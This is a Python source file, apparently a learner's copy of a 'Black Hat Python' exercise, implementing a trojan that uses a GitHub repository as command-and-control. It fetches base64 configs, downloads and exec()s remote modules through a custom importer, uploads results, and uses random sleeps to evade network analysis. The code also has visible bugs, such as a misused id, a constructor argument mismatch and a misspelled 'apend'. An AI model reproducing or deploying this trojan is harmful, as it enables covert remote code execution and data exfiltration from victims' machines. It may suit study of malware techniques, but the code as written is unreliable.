# a github aware trojan
import base64
import github3
import importlib
import json
import random
import sys
import threading
import time

from datetime import datetime

# save your access token to .gitignore as mytoken.txt
def github_connect():
    with open('mytoken.txt') as f:
        token = f.read()
    user = 'your github username'
    sess = github3.login(token=token)
    return sess.repository(user, 'bhptrojan')


# grabbing files from remote repo and reading the content in locally


def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content


class Trojan:
    def __init__(self):  # initializing trojan object
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'  # where trojan will write it output files
        self.repo = github_connect()

    # retrieves the remote configuration document from the repo so that the trojan knows which modules to run
    def get_config(self):
        config_json = get_file_contents('config', self.config_file, self.repo)
        config = json.loads(base64.b64decode(config_json))

        for task in config:
            if task['module'] not in sys.modules:
                exec("import %s" % task['module'])  # brings the module content into the trojan object

            return config

    # calls the run function of the modules just imported
    def module_runner(self, module):
        result = sys.modules[module].run()
        self.store_module_result(result)

    # creates a file whose name include current date and time and saves its output to a file
    def store_module_result(self, data):
        message = datetime.now().isoformat()
        remote_path = f'data/{self.id}/{message}.data'
        bindata = bytes('%r' % data, 'utf-8')
        self.repo.create_file(remote_path, message, base64.b64decode(bindata))

    # grabs the config file from the repo then we kick off the module in its own thread
    def run(self):
        while True:
            config = self.get_config()
            for task in config:
                thread = threading.Thread(target=self.module_runner, args=(task['module']))
                thread.start()
                time.sleep(random.randint(1, 10))

            # sleep for random amount of time to foil any network-pattern analysis
            time.sleep(random.randint(30 * 60, 3 * 60 * 60))


# everytime it attempts to load a module that is not available it will use the gitimport class
class GitImporter:
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, name, path=None):
        print("[*] Attempting to retrieve %s" % name)
        self.repo = github_connect()

        new_libary = get_file_contents('modules', f'{name}.py', self.repo)
        if new_libary is not None:
            self.current_module_code = base64.b64decode(new_libary)  # github send a base64 encoded data so we decode
            # it and sore it in our class
            return self
            # by returning self, we indicate that we found the module and it can load if using load_module function

    def load_module(self, name):
        spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.git_url)
        # use import lib to create a blank module object and shovel the code retrieved From github into it
        new_module = importlib.util.module_from_spec(spec)
        exec(self.current_module_code, new_module.__dict__)
        # insert newly created modules into sys.modules list for future import calls
        sys.modules[spec.name] = new_module
        return new_module



if __name__ =='__main__':
    sys.meta_path.apend(GitImporter())
    trojan = Trojan('abc')
    trojan.run()
